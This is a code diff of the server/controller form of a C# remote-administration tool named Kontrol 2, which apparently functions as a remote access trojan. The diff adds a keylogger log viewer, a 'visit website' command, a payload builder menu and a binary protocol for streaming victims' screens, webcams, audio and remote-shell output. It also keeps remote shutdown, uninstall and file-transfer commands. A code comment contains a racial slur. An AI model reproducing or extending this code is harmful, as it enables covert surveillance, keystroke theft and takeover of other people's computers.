@@ -22,12 +22,12 @@ namespace Kontrol_2_Server
 	public partial class MainForm : Form
 	{
 		//Server and client global variables
-		private static Socket _serverSocket;
-		private const int _BUFFER_SIZE = 20971520;
-		private const ushort _PORT = 7878;
-		private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
+		static Socket _serverSocket;
+		const int _BUFFER_SIZE = 20971520;
+		const ushort _PORT = 7878;
+		static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
 		public static readonly List<Socket> _clientSockets = new List<Socket>();
-		private static List<ClientInfo> _clientInfos = new List<ClientInfo>();
+		static List<ClientInfo> _clientInfos = new List<ClientInfo>();
 
 		//Form global variables
 		public static FileManagerForm fmf = new FileManagerForm();
@@ -37,19 +37,20 @@ namespace Kontrol_2_Server
 		public static RemoteAudioForm raf = new RemoteAudioForm();
 		public static RemoteDesktopForm rdf = new RemoteDesktopForm();
 		public static SendCommandForm scf = new SendCommandForm();
-		public static ChatForm cf = new ChatForm();
 		public static ReKodeEditor rke = new ReKodeEditor();
+		public static VisitWebsiteForm vwf = new VisitWebsiteForm();
+        public static KeyLoggerForm klf = new KeyLoggerForm();
 
-		//File operation variables
-		public static byte fo_mode = 255;
+        //File operation variables
+        public static byte fo_mode = 255;
 		public static string fo_path = null;
 		public static MemoryStream fileStream;
 		public static int fo_size = 0;
 		public static int fo_writeSize = 0;
-		private static byte[] fileBuffer = new byte[1];
+		static byte[] fileBuffer = new byte[1];
 
-		private static int recievedBytes = 0;
-		private static int sentBytes = 0;
+		static int recievedBytes = 0;
+		static int sentBytes = 0;
 		PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
 		PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
 		public MainForm()
@@ -57,7 +58,7 @@ namespace Kontrol_2_Server
 			InitializeComponent();
 		}
 
-		private void SetupServer()
+		void SetupServer()
 		{
 			toolStripStatusLabel1.Text = "Status: Starting...";
 			_serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -68,7 +69,7 @@ namespace Kontrol_2_Server
 			listUpdate.Start();
 		}
 
-		private void listClients()
+		void listClients()
 		{
 			try
 			{
@@ -159,7 +160,7 @@ namespace Kontrol_2_Server
 			catch { }
 		}
 
-		private void CloseAllSockets()
+		void CloseAllConnections()
 		{
 			foreach (Socket socket in _clientSockets)
 			{
@@ -169,7 +170,14 @@ namespace Kontrol_2_Server
 			_serverSocket.Close();
 		}
 
-		private void AcceptCallBack(IAsyncResult ar)
+		void CloseConnection(int clientId)
+		{
+			_clientSockets[clientId].Shutdown(SocketShutdown.Both);
+            _clientSockets[clientId].Close();
+			_clientInfos.RemoveAt(clientId);
+        }
+
+		void AcceptCallBack(IAsyncResult ar)
 		{
 			Socket socket;
 
@@ -187,16 +195,15 @@ namespace Kontrol_2_Server
 			int id = _clientSockets.Count - 1;
 			SendCommand("getinfo-" + id, id);
 			socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, socket);
-			//SendKeys.SendWait("its ok just not for everybody"); //nigga wut???
+			//SendKeys.SendWait("its ok just not for everybody"); // nigga wut???
 			_serverSocket.BeginAccept(AcceptCallBack, null);
 		}
 
-		//When client sendds back data to the server
-		private static int ckk = 0;
-		private void RecieveCallBack(IAsyncResult ar)
+		void RecieveCallBack(IAsyncResult ar)
 		{
-			Socket current = (Socket)ar.AsyncState;
-			int recieved;
+			Socket current = (Socket) ar.AsyncState;
+			if (!current.Connected) return;
+			int recieved = 0;
 			try
 			{
 				recieved = current.EndReceive(ar);
@@ -206,32 +213,36 @@ namespace Kontrol_2_Server
 				current.Close();
 				_clientInfos.RemoveAt(_clientSockets.IndexOf(current));
 				_clientSockets.Remove(current);
-				return;
 			}
 			byte[] recBuf = new byte[recieved];
 			Array.Copy(_buffer, recBuf, recieved);
 			current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, current);
 			new Thread(() =>
 			{
-				string header = Encoding.Unicode.GetString(recBuf, 0, 16);
-				if (header == "servmod^")
+				byte[] header = new byte[2];
+				Array.Copy(recBuf, header, 2);
+				if (header[0] == 0xFE)
 				{
-					string header_cmd = Encoding.Unicode.GetString(recBuf, 16, 16);
-					switch (header_cmd)
-					{
-						case "wcstream":
-							byte[] wcBytes = recBuf.Skip(32).ToArray();
+					switch (header[1])
+                    {
+                        case 0xF1:
+                            byte[] scBytes = recBuf.Skip(2).ToArray();
+                            rdf.processImage(scBytes);
+                            break;
+                        case 0xF2:
+							byte[] wcBytes = recBuf.Skip(2).ToArray();
 							rcf.displayImage(wcBytes);
 							break;
-						case "austream":
-							byte[] audioBytes = new byte[recBuf.Length - 32];
-							Buffer.BlockCopy(recBuf, 32, audioBytes, 0, audioBytes.Length);
-							raf.processAudio(audioBytes);
+						case 0xF3:
+							byte[] audioBytes = new byte[recBuf.Length - 2];
+							Buffer.BlockCopy(recBuf, 2, audioBytes, 0, audioBytes.Length);
+							raf.ProcessAudio(audioBytes);
 							break;
-						case "scstream":
-							byte[] scBytes = recBuf.Skip(32).ToArray();
-							rdf.processImage(scBytes);
-							break;
+						case 0xF4:
+							string text = Encoding.Unicode.GetString(recBuf.Skip(2).ToArray());
+							rsf.Append(text);
+							Console.WriteLine($"CMD: {text}");
+                            break;
 					}
 					return;
 				}
@@ -244,7 +255,7 @@ namespace Kontrol_2_Server
 						resp = Decrypt(resp);
 					}
 					catch { }
-					
+
 					if (resp.StartsWith("ERROR"))
 					{
 						MessageBox.Show("Client Error: " + resp.Split('\n')[1], "An error occured on the client side.", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -260,6 +271,11 @@ namespace Kontrol_2_Server
 							}
 						}
 						catch { }
+					}
+					else if (resp.StartsWith("klg"))
+					{
+						string[] xsplit = resp.Split('\n');
+						klf.AppendLog(new LogStructure(Convert.ToInt32(xsplit[1]), xsplit[2], xsplit[3]));
 					}
 					else if (resp.StartsWith("active_window"))
 					{
@@ -302,10 +318,6 @@ namespace Kontrol_2_Server
 								fmf.addFileToList(drive.Split('&')[0], drive.Split('&')[1], "N/A", "", "drive");
 							}
 						}
-					}
-					else if (resp.StartsWith("cmd_out"))
-					{
-						rsf.Append(resp.Split('\n')[1]);
 					}
 					else if (resp.StartsWith("infoback-"))
 					{
@@ -357,7 +369,7 @@ namespace Kontrol_2_Server
 											if (n != buffer.Length)
 												Array.Resize(ref buffer, n);
 
-											SendBytes(buffer, fmf.clientId, 0, n);
+											Send(buffer, fmf.clientId, 0, n);
 
 											bytesRead += n;
 											bytesToRead -= n;
@@ -413,24 +425,8 @@ namespace Kontrol_2_Server
 					else if (resp.StartsWith("remote_audio"))
 					{
 						string[] xsplit = resp.Split('\n');
-						switch (xsplit[1])
-						{
-							case "audio_devices":
-								raf.listDevices(xsplit[2]);
-								break;
-							case "-5":
-								raf.initialize("-5", int.Parse(xsplit[2]), int.Parse(xsplit[3]));
-								break;
-							case "0":
-								raf.initialize("0");
-								break;
-							/*case "start_recording":
-								raf.auStream = true;
-								break;
-							case "stop_recording":
-								raf.auStream = false;
-								break;*/
-						}
+						if (xsplit[1] == "audio_devices") raf.ListDevices(xsplit[2]);
+						else raf.Init(xsplit[1][0], int.Parse(xsplit[2]), int.Parse(xsplit[3]));
 					}
 					else if (resp.StartsWith("remote_desktop"))
 					{
@@ -446,64 +442,7 @@ namespace Kontrol_2_Server
 					else if (resp.StartsWith("display_msgbox"))
 					{
 						string[] xsplit = resp.Split('\n');
-						MessageBoxIcon icon = MessageBoxIcon.None;
-						MessageBoxButtons buttons = MessageBoxButtons.OK;
-						/*switch (int.Parse(xsplit[2]))
-						{
-							case 0:
-								icon = MessageBoxIcon.Asterisk;
-								break;
-							case 1:
-								icon = MessageBoxIcon.Error;
-								break;
-							case 2:
-								icon = MessageBoxIcon.Exclamation;
-								break;
-							case 3:
-								icon = MessageBoxIcon.Hand;
-								break;
-							case 4:
-								icon = MessageBoxIcon.Information;
-								break;
-							case 5:
-								icon = MessageBoxIcon.None;
-								break;
-							case 6:
-								icon = MessageBoxIcon.Question;
-								break;
-							case 7:
-								icon = MessageBoxIcon.Stop;
-								break;
-							case 8:
-								icon = MessageBoxIcon.Warning;
-								break;
-						}
-						switch (int.Parse(xsplit[3]))
-						{
-							case 0:
-								buttons = MessageBoxButtons.AbortRetryIgnore;
-								break;
-							case 1:
-								buttons = MessageBoxButtons.OK;
-								break;
-							case 2:
-								buttons = MessageBoxButtons.OKCancel;
-								break;
-							case 3:
-								buttons = MessageBoxButtons.RetryCancel;
-								break;
-							case 4:
-								buttons = MessageBoxButtons.YesNo;
-								break;
-							case 5:
-								buttons = MessageBoxButtons.YesNoCancel;
-								break;
-						}*/
-						MessageBox.Show(resp.Substring(resp.IndexOf("@{msg}") + 6), xsplit[1], (MessageBoxButtons)int.Parse(xsplit[3]), (MessageBoxIcon)int.Parse(xsplit[2]));
-					}
-					else if (resp.StartsWith("chat_in"))
-					{
-						cf.AppendText(resp.Substring(resp.IndexOf("@{msg}") + 6), resp.Split('\n')[1]);
+						MessageBox.Show(resp.Substring(resp.IndexOf("@[msg]") + 6), xsplit[1], (MessageBoxButtons) int.Parse(xsplit[2]), (MessageBoxIcon) int.Parse(xsplit[3]));
 					}
 					else if (fo_mode == 0)
 					{
@@ -591,7 +530,7 @@ namespace Kontrol_2_Server
 				SendCommand(cmd, client);
 			}
 		}
-		public int SendBytes(byte[] data, int targetClient, int offset = 0, int size = 0)
+		public static int Send(byte[] data, int targetClient, int offset = 0, int size = 0)
 		{
 			if (size == 0) size = data.Length;
 			int sent = _clientSockets[targetClient].Send(data, offset, size, SocketFlags.None);
@@ -602,7 +541,7 @@ namespace Kontrol_2_Server
 		{
 			foreach (int client in ClientsView.Items)
 			{
-				SendBytes(data, client);
+				Send(data, client);
 			}
 		}
 		public void DownloadFile(byte[] data)
@@ -658,16 +597,16 @@ namespace Kontrol_2_Server
 
 			}
 		}
-		private void MainForm_Shown(object sender, EventArgs e)
+		void MainForm_Shown(object sender, EventArgs e)
 		{
 			SetupServer();
 			statusUpdate.Start();
 		}
-		private void listUpdate_Tick(object sender, EventArgs e)
+		void listUpdate_Tick(object sender, EventArgs e)
 		{
 			listClients();
 		}
-		private void microsoftTextToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
+		void microsoftTextToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -676,7 +615,7 @@ namespace Kontrol_2_Server
 				t2sform.Show();
 			}
 		}
-		private void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
+		void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -686,7 +625,7 @@ namespace Kontrol_2_Server
 				msgform.Show();
 			}
 		}
-		private void playSinewaveFrequencyToolStripMenuItem_Click(object sender, EventArgs e)
+		void playSinewaveFrequencyToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -695,7 +634,7 @@ namespace Kontrol_2_Server
 				freqForm.Show();
 			}
 		}
-		private void playSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
+		void playSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -704,7 +643,7 @@ namespace Kontrol_2_Server
 				soundForm.Show();
 			}
 		}
-		private void proccessManagerToolStripMenuItem_Click(object sender, EventArgs e)
+		void proccessManagerToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -713,7 +652,7 @@ namespace Kontrol_2_Server
 			}
 
 		}
-		private void hideWindowsElementsToolStripMenuItem_Click(object sender, EventArgs e)
+		void hideWindowsElementsToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -722,7 +661,7 @@ namespace Kontrol_2_Server
 				hef.Show();
 			}
 		}
-		private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
+		void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -730,7 +669,7 @@ namespace Kontrol_2_Server
 				rsf.Show();
 			}
 		}
-		private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
+		void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -739,7 +678,7 @@ namespace Kontrol_2_Server
 				fmf.Show();
 			}
 		}
-		private void statusUpdate_Tick(object sender, EventArgs e)
+		void statusUpdate_Tick(object sender, EventArgs e)
 		{
 			if (this.InvokeRequired)
 			{
@@ -760,12 +699,12 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
+		void MainForm_FormClosing(object sender, FormClosingEventArgs e)
 		{
 			//e.Cancel = true;
 			//this.Hide();
 		}
-		private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
+		void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -773,7 +712,7 @@ namespace Kontrol_2_Server
 				rcf.Show();
 			}
 		}
-		private void remoteAudioToolStripMenuItem_Click(object sender, EventArgs e)
+		void remoteAudioToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -781,7 +720,7 @@ namespace Kontrol_2_Server
 				raf.Show();
 			}
 		}
-		private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
+		void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -790,18 +729,18 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void exitToolStripMenuItem_Click(object sender, EventArgs e)
+		void exitToolStripMenuItem_Click(object sender, EventArgs e)
 		{
-			CloseAllSockets();
+			CloseAllConnections();
 			Environment.Exit(0);
 		}
 
-		private void showToolStripMenuItem_Click(object sender, EventArgs e)
+		void showToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			this.Show();
 		}
 
-		private void exitToolStripMenuItem1_Click(object sender, EventArgs e)
+		void exitToolStripMenuItem1_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -809,7 +748,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
+		void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -817,7 +756,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
+		void sleepToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -825,7 +764,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void restartToolStripMenuItem_Click(object sender, EventArgs e)
+		void restartToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -833,7 +772,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
+		void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -841,7 +780,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void showLocationToolStripMenuItem_Click(object sender, EventArgs e)
+		void showLocationToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -849,7 +788,7 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void sendCommandToolStripMenuItem_Click(object sender, EventArgs e)
+		void sendCommandToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
@@ -858,22 +797,52 @@ namespace Kontrol_2_Server
 			}
 		}
 
-		private void chatToolStripMenuItem_Click(object sender, EventArgs e)
+		void chatToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
-				cf.clientId = ClientsView.SelectedIndices[0];
-				cf.Show();
+
 			}
 		}
 
-		private void compileCScriptToolStripMenuItem_Click(object sender, EventArgs e)
+		void compileCScriptToolStripMenuItem_Click(object sender, EventArgs e)
 		{
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
 				rke.clientId = ClientsView.SelectedIndices[0];
 				rke.Show();
 			}
+		}
+
+		void reloadToolStripMenuItem_Click(object sender, EventArgs e)
+		{
+            if (ClientsView.SelectedIndices.Count > 0)
+            {
+                SendCommand("conditions_reload", ClientsView.SelectedIndices[0]);
+            }
+        }
+
+		void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
+		{
+            if (ClientsView.SelectedIndices.Count > 0)
+            {
+                vwf.clientId = ClientsView.SelectedIndices[0];
+                vwf.Show();
+            }
+        }
+
+		void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
+		{
+			if (ClientsView.SelectedIndices.Count > 0)
+			{
+				klf.clientId = ClientsView.SelectedIndices[0];
+                klf.Show();
+			}
+		}
+
+		void builderToolStripMenuItem_Click(object sender, EventArgs e)
+		{
+			new BuilderForm().Show();
 		}
 	}
 
